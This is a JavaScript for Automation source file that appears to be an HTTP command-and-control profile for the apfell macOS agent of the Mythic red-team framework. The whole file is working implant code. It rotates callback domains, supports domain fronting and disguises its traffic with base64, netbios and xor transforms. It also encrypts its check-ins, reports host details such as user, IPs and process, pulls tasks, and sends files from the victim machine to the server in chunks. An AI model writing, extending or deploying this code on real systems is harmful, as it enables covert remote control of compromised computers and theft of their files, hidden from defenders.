//-------------HTTPX C2 profile for apfell (JXA) ---------------------------------

class customC2 extends baseC2 {
    constructor(interval, baseurl) {
        super(interval, baseurl);

        // Malleable config object stamped in by the builder
        this.config = raw_c2_config;

        // Multiple callback domains
        this.domains = baseurl.split(",").map(s => s.trim()).filter(s => s.length > 0);
        this.domainRotation = "domain_rotation";
        this.failoverThreshold = parseInt("failover_threshold") || 5;
        this.failureCount = 0;
        this.currentDomainIndex = 0;

        this.interval = parseInt("callback_interval") || 10;
        this.jitter = parseFloat("callback_jitter") || 23;

        // Proxy
        this.proxyHost = "proxy_host";
        this.proxyPort = parseInt("proxy_port") || 0;
        this.proxyUser = "proxy_user";
        this.proxyPass = "proxy_pass";
        this.domainFront = ("domain_front" === "domain_front") ? "" : "domain_front";

        this.proxy_dict = {};
        if (this.proxyHost !== "") {
            if (this.proxyHost.includes("https")) {
                this.proxy_dict["HTTPSEnable"] = 1;
                this.proxy_dict["HTTPSProxy"] = this.proxyHost;
                this.proxy_dict["HTTPSPort"] = parseInt(this.proxyPort);
            } else {
                this.proxy_dict["HTTPEnable"] = 1;
                this.proxy_dict["HTTPProxy"] = this.proxyHost;
                this.proxy_dict["HTTPPort"] = parseInt(this.proxyPort);
            }
            if (this.proxyUser !== "") {
                this.proxy_dict["kCFProxyUsernameKey"] = this.proxyUser;
            }
            if (this.proxyPass !== "") {
                this.proxy_dict["kCFProxyPasswordKey"] = this.proxyPass;
            }
        }

        // AES-256-CBC setup
        this.aes_psk = "AESPSK";
        if (this.aes_psk !== "") {
            this.parameters = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
            $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyType, $.kSecAttrKeyTypeAES);
            $.CFDictionarySetValue(this.parameters, $.kSecAttrKeySizeInBits, $.kSecAES256);
            $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyClass, $.kSecAttrKeyClassSymmetric);
            $.CFDictionarySetValue(this.parameters, $.kSecClass, $.kSecClassKey);
            this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
            let err = Ref();
            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, err);
        }

        this.using_key_exchange = "encrypted_exchange_check" === "true";
        this.exchanging_keys = this.using_key_exchange;

        if ("killdate" !== "yyyy-mm-dd" && "killdate" !== "") {
            this.dateFormatter = $.NSDateFormatter.alloc.init;
            this.dateFormatter.setDateFormat("yyyy-MM-dd");
            this.kill_date = this.dateFormatter.dateFromString("killdate");
        } else {
            this.kill_date = $.NSDate.distantFuture;
        }
    }

    // ---- domain rotation ----
    getCurrentDomain() {
        if (this.domains.length === 0) { $.NSApplication.sharedApplication.terminate(this); }
        switch (this.domainRotation) {
            case "round-robin": {
                let idx = this.currentDomainIndex;
                this.currentDomainIndex = (this.currentDomainIndex + 1) % this.domains.length;
                return this.domains[idx];
            }
            case "random":
                return this.domains[Math.floor(Math.random() * this.domains.length)];
            case "fail-over":
            default:
                return this.domains[this.currentDomainIndex];
        }
    }
    handleDomainFailure() {
        this.failureCount++;
        if (this.failureCount >= this.failoverThreshold) {
            this.currentDomainIndex = (this.currentDomainIndex + 1) % this.domains.length;
            this.failureCount = 0;
        }
    }
    handleDomainSuccess() { this.failureCount = 0; }

    // ---- sleep helpers ----
    get_random_int(max) { return Math.floor(Math.random() * Math.floor(max + 1)); }
    gen_sleep_time() {
        if (this.jitter < 1) { return this.interval; }
        let sign = this.get_random_int(1);
        let delta = this.interval * (this.get_random_int(this.jitter) / 100);
        return sign === 1 ? this.interval + delta : this.interval - delta;
    }

    // ---- malleable config helpers ----
    getVariation(method) {
        let upper = method.toUpperCase();
        let lower = method.toLowerCase();
        return (this.config && (this.config[upper] || this.config[lower])) || null;
    }

    // ---- transform chain ----
    // Transforms operate on JS strings; binary data is kept as base64 between steps.
    applyTransforms(input, transforms) {
        if (!transforms || transforms.length === 0) { return input; }
        let cur = input;
        for (let t of transforms) {
            switch (t.action) {
                case "base64": {
                    cur = $(cur).dataUsingEncoding($.NSUTF8StringEncoding).base64EncodedStringWithOptions(0).js;
                    break;
                }
                case "base64url": {
                    let b64 = $(cur).dataUsingEncoding($.NSUTF8StringEncoding).base64EncodedStringWithOptions(0).js;
                    cur = b64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
                    break;
                }
                case "netbios": {
                    let out = "";
                    for (let i = 0; i < cur.length; i++) {
                        let c = cur.charCodeAt(i);
                        out += String.fromCharCode((c >> 4) + 0x61) + String.fromCharCode((c & 0xf) + 0x61);
                    }
                    cur = out;
                    break;
                }
                case "netbiosu": {
                    let out = "";
                    for (let i = 0; i < cur.length; i++) {
                        let c = cur.charCodeAt(i);
                        out += String.fromCharCode((c >> 4) + 0x41) + String.fromCharCode((c & 0xf) + 0x41);
                    }
                    cur = out;
                    break;
                }
                case "xor": {
                    if (!t.value || t.value.length === 0) { break; }
                    let out = "";
                    for (let i = 0; i < cur.length; i++) {
                        out += String.fromCharCode(cur.charCodeAt(i) ^ t.value.charCodeAt(i % t.value.length));
                    }
                    cur = out;
                    break;
                }
                case "prepend":
                    cur = (t.value || "") + cur;
                    break;
                case "append":
                    cur = cur + (t.value || "");
                    break;
                default: break;
            }
        }
        return cur;
    }

    reverseTransforms(input, transforms) {
        if (!transforms || transforms.length === 0) { return input; }
        let cur = input;
        for (let t of transforms.slice().reverse()) {
            switch (t.action) {
                case "base64": {
                    let nsdata = $.NSData.alloc.initWithBase64Encoding(cur);
                    cur = $.NSString.alloc.initWithDataEncoding(nsdata, $.NSUTF8StringEncoding).js;
                    break;
                }
                case "base64url": {
                    let b64 = cur.replace(/-/g, "+").replace(/_/g, "/");
                    while (b64.length % 4 !== 0) { b64 += "="; }
                    let nsdata = $.NSData.alloc.initWithBase64Encoding(b64);
                    cur = $.NSString.alloc.initWithDataEncoding(nsdata, $.NSUTF8StringEncoding).js;
                    break;
                }
                case "netbios": {
                    let out = "";
                    for (let i = 0; i < cur.length - 1; i += 2) {
                        out += String.fromCharCode(((cur.charCodeAt(i) - 0x61) << 4) | (cur.charCodeAt(i + 1) - 0x61));
                    }
                    cur = out;
                    break;
                }
                case "netbiosu": {
                    let out = "";
                    for (let i = 0; i < cur.length - 1; i += 2) {
                        out += String.fromCharCode(((cur.charCodeAt(i) - 0x41) << 4) | (cur.charCodeAt(i + 1) - 0x41));
                    }
                    cur = out;
                    break;
                }
                case "xor": {
                    if (!t.value || t.value.length === 0) { break; }
                    let out = "";
                    for (let i = 0; i < cur.length; i++) {
                        out += String.fromCharCode(cur.charCodeAt(i) ^ t.value.charCodeAt(i % t.value.length));
                    }
                    cur = out;
                    break;
                }
                case "prepend":
                    if (t.value && cur.startsWith(t.value)) { cur = cur.substring(t.value.length); }
                    break;
                case "append":
                    if (t.value && cur.endsWith(t.value)) { cur = cur.substring(0, cur.length - t.value.length); }
                    break;
                default: break;
            }
        }
        return cur;
    }

    // ---- AES encryption (identical to http.js) ----
    encrypt_message(uid, data) {
        let err = Ref();
        let encrypt = $.SecEncryptTransformCreate(this.cryptokey, err);
        $.SecTransformSetAttribute(encrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
        $.SecTransformSetAttribute(encrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
        let IV = $.NSMutableData.dataWithLength(16);
        $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
        $.SecTransformSetAttribute(encrypt, $("SecIVKey"), IV, err);
        let nsdata = $(data).dataUsingEncoding($.NSUTF8StringEncoding);
        $.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, nsdata, err);
        let encryptedData = $.SecTransformExecute(encrypt, err);
        let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
        let hmac_input = $.NSMutableData.dataWithLength(0);
        hmac_input.appendData(IV);
        hmac_input.appendData(encryptedData);
        $.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, hmac_input, err);
        $.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
        let hmac_data = $.SecTransformExecute(hmac_transform, err);
        let final_message = $.NSMutableData.dataWithLength(0);
        final_message.appendData($(uid).dataUsingEncoding($.NSUTF8StringEncoding));
        final_message.appendData(IV);
        final_message.appendData(encryptedData);
        final_message.appendData(hmac_data);
        return final_message.base64EncodedStringWithOptions(0).js;
    }

    decrypt_message(nsdata) {
        let err = Ref();
        let decrypt = $.SecDecryptTransformCreate(this.cryptokey, err);
        $.SecTransformSetAttribute(decrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
        $.SecTransformSetAttribute(decrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
        let iv_range = $.NSMakeRange(0, 16);
        let message_range = $.NSMakeRange(16, nsdata.length - 48);
        let hmac_range = $.NSMakeRange(nsdata.length - 32, 32);
        let hmac_data_range = $.NSMakeRange(0, nsdata.length - 32);
        let iv = nsdata.subdataWithRange(iv_range);
        $.SecTransformSetAttribute(decrypt, $("SecIVKey"), iv, err);
        let message = nsdata.subdataWithRange(message_range);
        $.SecTransformSetAttribute(decrypt, $("INPUT"), message, err);
        let message_hmac = nsdata.subdataWithRange(hmac_range);
        let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
        $.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, nsdata.subdataWithRange(hmac_data_range), err);
        $.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
        let hmac_data = $.SecTransformExecute(hmac_transform, err);
        if (hmac_data.isEqualToData(message_hmac)) {
            let decryptedData = $.SecTransformExecute(decrypt, Ref());
            return $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
        }
        return undefined;
    }

    // ---- RSA key exchange (identical to http.js) ----
    negotiate_key() {
        let parameters = $({"type": $("42"), "bsiz": 4096, "perm": false});
        let err = Ref();
        let privatekey = $.SecKeyCreateRandomKey(parameters, err);
        let publickey = $.SecKeyCopyPublicKey(privatekey);
        let exported_public = $.SecKeyCopyExternalRepresentation(publickey, err);
        let b64_exported_public;
        try {
            let collectable = $.CFMakeCollectable(exported_public);
            b64_exported_public = collectable.base64EncodedStringWithOptions(0).js;
        } catch (e) {
            b64_exported_public = exported_public.base64EncodedStringWithOptions(0).js;
        }
        let s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let session_key = Array(20).join().split(',').map(() => s.charAt(Math.floor(Math.random() * s.length))).join('');
        let initial_message = {"session_id": session_key, "pub_key": b64_exported_public, "action": "staging_rsa"};
        while (true) {
            try {
                let stage1 = this.htmlPostData(initial_message, apfell.uuid);
                let enc_key = $.NSData.alloc.initWithBase64Encoding(stage1['session_key']);
                let dec_key = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, enc_key, err);
                try {
                    this.aes_psk = dec_key.base64EncodedStringWithOptions(0).js;
                } catch (e) {
                    this.aes_psk = $.CFMakeCollectable(dec_key).base64EncodedStringWithOptions(0).js;
                }
                this.parameters = $({"type": $.kSecAttrKeyTypeAES});
                this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
                this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
                this.exchanging_keys = false;
                return stage1['uuid'];
            } catch (error) {
                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
            }
        }
    }

    // ---- low-level HTTP request ----
    makeRequest(verb, url, headers, bodyStr) {
        let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
        req.setHTTPMethod($.NSString.alloc.initWithUTF8String(verb));
        if (this.domainFront !== "") {
            req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.domainFront), $.NSString.alloc.initWithUTF8String("Host"));
        }
        for (let hk in headers) {
            req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(headers[hk]), $.NSString.alloc.initWithUTF8String(hk));
        }
        if (bodyStr !== null && bodyStr !== undefined) {
            let postData = $(bodyStr).dataUsingEncodingAllowLossyConversion($.NSASCIIStringEncoding, true);
            req.addValueForHTTPHeaderField($.NSString.stringWithFormat("%d", postData.length), $.NSString.alloc.initWithUTF8String("Content-Length"));
            req.setHTTPBody(postData);
        }
        let session_config = $.NSURLSessionConfiguration.ephemeralSessionConfiguration;
        if (Object.keys(this.proxy_dict).length > 0) {
            session_config.connectionProxyDictionary = $(this.proxy_dict);
        }
        let session = $.NSURLSession.sessionWithConfiguration(session_config);
        let finished = false;
        let responseData;
        session.dataTaskWithRequestCompletionHandler(req, (data, resp) => {
            finished = true;
            responseData = data;
        }).resume;
        while (!finished) { delay(0.1); }
        return responseData;
    }

    // ---- build and send a request using the malleable variation ----
    sendWithVariation(variation, messageStr) {
        let clientCfg = variation.client || {};
        let serverCfg = variation.server || {};
        let clientTransforms = clientCfg.transforms || [];
        let serverTransforms = serverCfg.transforms || [];
        let msgCfg = clientCfg.message || {};
        let msgLocation = (msgCfg.location || "body").toLowerCase();
        let msgName = msgCfg.name || "data";
        let clientHeaders = clientCfg.headers || {};
        let clientParams = clientCfg.parameters || {};
        let uris = variation.uris || variation.URIs || ["/"];
        let verb = (variation.verb || "POST").toUpperCase();

        let domain = this.getCurrentDomain();
        let uri = uris[Math.floor(Math.random() * uris.length)];
        let url = domain + uri;

        let transformed = this.applyTransforms(messageStr, clientTransforms);

        let headers = {};
        for (let hk in clientHeaders) { headers[hk] = clientHeaders[hk]; }

        let bodyStr = null;

        if (msgLocation === "query") {
            let queryParts = [];
            for (let pk in clientParams) {
                queryParts.push(pk + "=" + encodeURIComponent(clientParams[pk]));
            }
            // Use the already-transformed string as-is for the query param (transforms handle encoding)
            let urlSafe = transformed.replace(/\+/g, "-").replace(/\//g, "_");
            queryParts.push(msgName + "=" + urlSafe);
            url = url.split("?")[0] + "?" + queryParts.join("&");
        } else if (msgLocation === "body") {
            bodyStr = transformed;
        } else if (msgLocation === "cookie") {
            headers["Cookie"] = msgName + "=" + transformed;
        } else if (msgLocation === "header") {
            headers[msgName] = transformed;
        } else {
            bodyStr = transformed;
        }

        let responseData = this.makeRequest(verb, url, headers, bodyStr);
        if (responseData === undefined || responseData.length < 36) {
            this.handleDomainFailure();
            return undefined;
        }
        this.handleDomainSuccess();

        // Decode response: apply reverse server transforms, then base64-decode Mythic message
        let respStr = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding).js;
        let extracted = this.reverseTransforms(respStr, serverTransforms);

        let resp = $.NSData.alloc.initWithBase64Encoding(extracted);
        if (!resp || resp.length < 36) { return undefined; }
        let message_range = $.NSMakeRange(36, resp.length - 36);
        return resp.subdataWithRange(message_range);
    }

    // ---- main send/receive (replaces htmlPostData + htmlGetData) ----
    htmlPostData(sendData, uid, json = true) {
        let messageStr;
        if (this.aes_psk !== "") {
            messageStr = this.encrypt_message(uid, JSON.stringify(sendData));
        } else if (typeof(sendData) === "string") {
            let raw = $(uid + sendData).dataUsingEncoding($.NSUTF8StringEncoding);
            messageStr = raw.base64EncodedStringWithOptions(0).js;
        } else {
            let raw = $(uid + JSON.stringify(sendData)).dataUsingEncoding($.NSUTF8StringEncoding);
            messageStr = raw.base64EncodedStringWithOptions(0).js;
        }

        // Pick variation based on message size (same heuristic as Apollo)
        let usePost = messageStr.length > 500;
        let variation = this.getVariation(usePost ? "post" : "get") || this.getVariation(usePost ? "get" : "post");
        if (!variation) { return {}; }

        for (let i = 0; i < 10; i++) {
            if (!apfell.checked_in) { i = 0; }
            try {
                if ($.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending) {
                    $.NSApplication.sharedApplication.terminate(this);
                }
                if ((apfell.id === undefined || apfell.id === "") && (uid === undefined || uid === "")) {
                    $.NSApplication.sharedApplication.terminate(this);
                }
                let msgData = this.sendWithVariation(variation, messageStr);
                if (msgData === undefined) {
                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
                    continue;
                }
                if (this.aes_psk !== "") {
                    if (json) {
                        return JSON.parse(ObjC.unwrap(this.decrypt_message(msgData)));
                    } else {
                        return this.decrypt_message(msgData);
                    }
                } else {
                    if (json) {
                        return JSON.parse(ObjC.deepUnwrap($.NSString.alloc.initWithDataEncoding(msgData, $.NSUTF8StringEncoding)));
                    } else {
                        return $.NSString.alloc.initWithDataEncoding(msgData, $.NSUTF8StringEncoding).js;
                    }
                }
            } catch (error) {
                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
            }
        }
        return {};
    }

    htmlGetData() {
        let data = {"tasking_size": 1, "action": "get_tasking"};
        let messageStr;
        if (this.aes_psk !== "") {
            messageStr = this.encrypt_message(apfell.id, JSON.stringify(data));
        } else {
            let raw = $(apfell.id + JSON.stringify(data)).dataUsingEncoding($.NSUTF8StringEncoding);
            messageStr = raw.base64EncodedStringWithOptions(0).js;
        }

        let variation = this.getVariation("get") || this.getVariation("post");
        if (!variation) { return {}; }

        for (let i = 0; i < 10; i++) {
            if (!apfell.checked_in) { i = 0; }
            try {
                if ($.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending) {
                    $.NSApplication.sharedApplication.terminate(this);
                }
                if (apfell.id === undefined || apfell.id === "") {
                    $.NSApplication.sharedApplication.terminate(this);
                }
                let msgData = this.sendWithVariation(variation, messageStr);
                if (msgData === undefined) {
                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
                    continue;
                }
                if (this.aes_psk !== "") {
                    return JSON.parse(ObjC.unwrap(this.decrypt_message(msgData)));
                } else {
                    return JSON.parse(ObjC.deepUnwrap($.NSString.alloc.initWithDataEncoding(msgData, $.NSUTF8StringEncoding)));
                }
            } catch (error) {
                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
            }
        }
        return {};
    }

    // ---- public interface (identical to http.js) ----
    getConfig() {
        let config = {
            "C2": {
                "domains": this.domains,
                "interval": this.interval,
                "jitter": this.jitter,
                "domain_rotation": this.domainRotation,
                "aes_psk": this.aes_psk
            },
            "Host": {
                "user": apfell.user,
                "fullName": apfell.fullName,
                "ips": apfell.ip,
                "hosts": apfell.host,
                "environment": apfell.environment,
                "uptime": apfell.uptime,
                "args": apfell.args,
                "pid": apfell.pid,
                "apfell_id": apfell.id,
                "payload_id": apfell.uuid
            }
        };
        return JSON.stringify(config, null, 2);
    }

    checkin(ip, pid, user, host, os, arch, domain) {
        let info = {
            'ips': ip, 'pid': pid, 'user': user, 'host': host,
            'uuid': apfell.uuid, "os": os, "architecture": arch, "domain": domain, "action": "checkin"
        };
        info["process_name"] = apfell.procInfo.processName.js;
        info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
        info['cwd'] = $.NSFileManager.defaultManager.currentDirectoryPath.js;
        if (user === "root") { info['integrity_level'] = 3; }
        let jsondata;
        if (this.using_key_exchange) {
            let sessionID = this.negotiate_key();
            jsondata = this.htmlPostData(info, sessionID);
        } else {
            jsondata = this.htmlPostData(info, apfell.uuid);
        }
        apfell.id = jsondata.id;
        apfell.checked_in = true;
        if (apfell.id === undefined) { $.NSApplication.sharedApplication.terminate(this); }
        return jsondata;
    }

    getTasking() {
        for (let i = 0; i < 10; i++) {
            try {
                let task = this.htmlGetData();
                if (task['tasks'] !== undefined) { return task['tasks']; }
                return [];
            } catch (error) {
                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
            }
        }
        return [];
    }

    postResponse(task, output) { return this.postRESTResponse(output, task.id); }

    postRESTResponse(data, tid) {
        data["task_id"] = tid;
        let postData = {"action": "post_response", "responses": [data]};
        return this.htmlPostData(postData, apfell.id);
    }

    download(task, params) {
        let output = "";
        if (does_file_exist(params)) {
            let offset = 0;
            let chunkSize = 512000;
            let full_path = params;
            try {
                let fm = $.NSFileManager.defaultManager;
                let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(params));
                full_path = "/" + pieces.slice(1).join("/");
                var handle = $.NSFileHandle.fileHandleForReadingAtPath(full_path);
                if (handle.js === undefined) {
                    return {"status": "error", "user_output": "Access denied or path was to a folder", "completed": true};
                }
                var fileSize = handle.seekToEndOfFile;
            } catch (error) {
                return {'status': 'error', 'user_output': error.toString(), 'completed': true};
            }
            let numOfChunks = Math.ceil(fileSize / chunkSize);
            let registerData = {"download": {'total_chunks': numOfChunks, 'full_path': full_path}};
            let registerFile = this.postResponse(task, registerData);
            registerFile = registerFile['responses'][0];
            if (registerFile['status'] === "success") {
                this.postResponse(task, {"user_output": JSON.stringify({
                    "agent_file_id": registerFile["file_id"],
                    "total_chunks": numOfChunks
                })});
                handle.seekToFileOffset(0);
                let currentChunk = 1;
                let data = handle.readDataOfLength(chunkSize);
                while (parseInt(data.length) > 0 && offset < fileSize) {
                    let fileData = {"download": {
                        'chunk_num': currentChunk,
                        'chunk_data': data.base64EncodedStringWithOptions(0).js,
                        'file_id': registerFile['file_id']
                    }};
                    this.postResponse(task, fileData);
                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
                    offset += parseInt(data.length);
                    handle.seekToFileOffset(offset);
                    currentChunk += 1;
                    data = handle.readDataOfLength(chunkSize);
                }
                output = {"completed": true, "user_output": `{"file_id": "${registerFile['file_id']}", "completed": true}`, "file_id": registerFile['file_id']};
            } else {
                output = {'status': 'error', 'user_output': "Failed to register file to download", 'completed': true};
            }
        } else {
            output = {'status': 'error', 'user_output': "file does not exist", 'completed': true};
        }
        return output;
    }

    upload(task, file_id, full_path) {
        try {
            let data = {"action": "post_response", "responses": [
                {"upload": {"file_id": file_id, "chunk_size": 512000, "chunk_num": 1, "full_path": full_path}, "task_id": task.id}
            ]};
            let chunk_num = 1;
            let total_chunks = 1;
            let total_data = $.NSMutableData.dataWithLength(0);
            do {
                let file_data = this.htmlPostData(data, apfell.id);
                if (file_data["responses"][0]['chunk_num'] === 0) { return "error from server"; }
                chunk_num = file_data["responses"][0]['chunk_num'];
                total_chunks = file_data["responses"][0]['total_chunks'];
                total_data.appendData($.NSData.alloc.initWithBase64Encoding($(file_data["responses"][0]['chunk_data'])));
                data = {"action": "post_response", "responses": [
                    {"upload": {"file_id": file_id, "chunk_size": 512000, "chunk_num": chunk_num + 1}, "task_id": task.id}
                ]};
            } while (chunk_num < total_chunks);
            return total_data;
        } catch (error) {
            return error.toString();
        }
    }
}

//------------- INSTANTIATE -----------------------
ObjC.import('Security');
var C2 = new customC2(parseInt("callback_interval") || 10, "callback_domains");
